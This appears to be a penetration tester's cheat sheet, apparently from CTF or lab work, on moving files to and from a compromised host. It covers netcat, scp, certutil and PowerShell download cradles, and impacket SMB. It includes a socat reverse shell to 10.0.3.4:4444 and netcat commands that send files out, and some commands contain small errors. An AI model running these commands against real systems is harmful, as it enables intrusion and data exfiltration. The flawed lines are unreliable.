---
icon: person-to-portal
description: Listeners and binaries
---

# File Transfer

## <mark style="color:purple;">Linux</mark>

{% hint style="warning" %}
### <mark style="color:purple;">base64</mark>

* <mark style="color:purple;">Using</mark> <mark style="color:orange;">**`base64`**</mark> <mark style="color:purple;">help to keep file integrity</mark>
* <mark style="color:purple;">Check hashes to avoid file corruption</mark>

```sh
md5sum <file>
```

***

{% code title="Pipe text in to a file" %}
```sh
echo "texto_base_64" | base64 -d > <file>
```
{% endcode %}

{% code title="Pipe file in to base64" %}
```sh
cat <file> | base64 -d > <file>
```
{% endcode %}
{% endhint %}

{% tabs %}
{% tab title="Python Web Server" %}
{% code title="Host" %}
```sh
python3 -m http.server 443
```
{% endcode %}

***

#### <mark style="color:purple;">Client</mark>

{% code title="curl" %}
```sh
curl -o IP:Port/file
```
{% endcode %}

{% code title="wget" %}
```bash
wget IP:Port/file
```
{% endcode %}
{% endtab %}

{% tab title="Netcat" %}
{% code title="Host" %}
```sh
nc -lvp <Local_IP> > file
```
{% endcode %}

{% code title="Client" %}
```sh
nc <Target_IP> <port> < file
```
{% endcode %}

***

{% code title="With cat" %}
```sh
cat <file> | nc Target_IP 443
```
{% endcode %}
{% endtab %}

{% tab title="Apache" %}
```
cp archivo.txt /var/www/html
```
{% endtab %}

{% tab title="SSH" %}
{% code title="Scapy" %}
```sh
shpass -p <password> scp <filename> admin@2million.htb:/tmp/
```
{% endcode %}
{% endtab %}

{% tab title="Socat" %}
{% code title="Listener" %}
```sh
socat file:`tty`,raw,echo=0 tcp-listen:4444
```
{% endcode %}

{% code title="Target Machine" %}
```
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
```
{% endcode %}
{% endtab %}
{% endtabs %}

## <mark style="color:purple;">Windows</mark>

{% tabs %}
{% tab title="certutil" %}
{% code title="First, start a python web server" %}
```
python3 -m http.server 443
```
{% endcode %}

{% code title="Then" %}
```powershell
certutil.exe -f -urlcache -split http://<IP>/<file>
```
{% endcode %}
{% endtab %}

{% tab title="Invoke-WebRequest" %}
{% code title="First, start a python web-server" %}
```bash
python3 -m http.server 443
```
{% endcode %}

{% code title="Then" %}
```powershell
IWR -uri http://<ip>/<file> -OutFile <file_name>
```
{% endcode %}

***

{% code title="Powershell" %}
```powershell
powershell.exe iwr -uri http://<ip>/<file> -o <output_dest>
```
{% endcode %}

{% code title="invoke PowerShell" %}
```powershell
powershell.exe -command iwr -Uri http://<ip>/<file> -OutFile <destino_output_file>
```
{% endcode %}
{% endtab %}

{% tab title="Impacket" %}
{% code title="First, create a SMB share folder" %}
```bash
impacket-smbserver <share_name> <file_path> -smb2support
```
{% endcode %}

{% code title="Then, copy the files" %}
```powershell
copy \\<ip>\share\<file> <destination_path>
```
{% endcode %}
{% endtab %}

{% tab title="curl/wget" %}
{% code title="curl" %}
```powershell
curl http://ip/file -o <output>
```
{% endcode %}

{% code title="wget" %}
```powershell
wget http://ip/file -OutFile <output>
```
{% endcode %}
{% endtab %}

{% tab title="System.Net.WebClient" %}
{% code title="" %}
```powershell
powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://ip/file', '<output>')
```
{% endcode %}
{% endtab %}
{% endtabs %}

## <mark style="color:purple;">Useful binaries</mark>

{% embed url="https://github.com/andrew-d/static-binaries" %}
